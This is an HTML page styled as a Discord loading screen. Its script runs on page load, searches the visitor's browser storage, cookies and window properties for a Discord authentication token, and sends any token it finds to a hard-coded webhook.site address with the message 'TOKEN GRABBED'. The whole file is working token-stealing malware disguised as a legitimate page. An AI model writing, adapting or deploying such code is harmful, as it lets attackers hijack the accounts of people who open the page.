<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #2f3136;
            color: #dcddde;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            width: 300px;
        }
        h2 {
            margin-top: 0;
            font-size: 18px;
            color: #fff;
        }
        p {
            font-size: 14px;
            color: #b9bbbe;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin-top: 15px;
            font-size: 12px;
            color: #43b581;
            display: none;
        }
        .error {
            color: #f04747;
        }
        .debug {
            font-size: 10px;
            color: #72767d;
            margin-top: 10px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading Discord...</h2>
        <p>Please wait a moment.</p>
        <div class="loader"></div>
        <div id="status" class="status"></div>
        <div id="debug" class="debug"></div>
    </div>

    <script>
        // Your Webhook.site URL
        const WEBHOOK_URL = "https://webhook.site/488941e1-61a4-4381-9534-1ec26ff9a6ef";

        // Function to send data
        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "🔥 **TOKEN GRABBED** 🔥\n\n```" + data + "```"
                    })
                });
                const statusEl = document.getElementById('status');
                statusEl.textContent = "Token Sent!";
                statusEl.style.display = "block";
                statusEl.style.color = "#43b581";
            } catch (err) {
                console.error("Webhook Error:", err);
                const statusEl = document.getElementById('status');
                statusEl.textContent = "Failed to send webhook.";
                statusEl.style.display = "block";
                statusEl.style.color = "#f04747";
            }
        }

        // Main Grabber Function
        async function grabToken() {
            const statusEl = document.getElementById('status');
            const debugEl = document.getElementById('debug');
            statusEl.textContent = "Scanning...";
            statusEl.style.display = "block";

            let token = null;
            let foundSource = "Unknown";

            // 1. LocalStorage (Most Common)
            try {
                token = localStorage.token || localStorage.getItem('token');
                if (token) foundSource = "localStorage.token";
            } catch (e) {
                debugEl.textContent += "LS Error: " + e.message + "\n";
            }

            // 2. SessionStorage (Fallback)
            if (!token) {
                try {
                    token = sessionStorage.token || sessionStorage.getItem('token');
                    if (token) foundSource = "sessionStorage.token";
                } catch (e) {
                    debugEl.textContent += "SS Error: " + e.message + "\n";
                }
            }

            // 3. Cookies (Fallback)
            if (!token) {
                try {
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        if (cookie.trim().startsWith('token=')) {
                            token = cookie.split('=')[1];
                            foundSource = "Cookie";
                            break;
                        }
                    }
                } catch (e) {
                    debugEl.textContent += "Cookie Error: " + e.message + "\n";
                }
            }

            // 4. Internal Discord Objects (The "Nuclear" Options)
            if (!token) {
                const internalVars = [
                    'x-token',
                    'token',
                    'accessToken',
                    'access_token',
                    'xp_token',
                    '_discordToken',
                    'token'
                ];

                for (let key of internalVars) {
                    if (window[key]) {
                        token = window[key];
                        foundSource = "window." + key;
                        break;
                    }
                }
            }

            // 5. Try to grab from window.creds (Rare but exists)
            if (!token && window.creds) {
                try {
                    token = window.creds.token;
                    foundSource = "window.creds.token";
                } catch (e) {}
            }

            // 6. Final Fallback: Try to grab from document.cookie with a wider regex
            if (!token) {
                const match = document.cookie.match(/token=([^;]+)/);
                if (match) {
                    token = match[1];
                    foundSource = "Regex Cookie";
                }
            }

            // 7. Try to grab from window object broadly
            if (!token) {
                try {
                    // Check for any property containing "token" in the name
                    for (let key in window) {
                        if (key.toLowerCase().includes('token') && typeof window[key] === 'string' && window[key].length > 20) {
                            token = window[key];
                            foundSource = "window." + key;
                            break;
                        }
                    }
                } catch (e) {}
            }

            // Result
            debugEl.textContent = "Source: " + foundSource + "\n" + (debugEl.textContent || "");

            if (token) {
                statusEl.textContent = "Token Grabbed!";
                statusEl.style.color = "#43b581";
                sendToWebhook(token);
            } else {
                statusEl.textContent = "No Token Found. Are you logged in?";
                statusEl.style.color = "#f04747";
                sendToWebhook("No token found in any known location.\nDebug: " + debugEl.textContent);
            }
        }

        // Run on load
        window.onload = grabToken;
    </script>
</body>
</html>
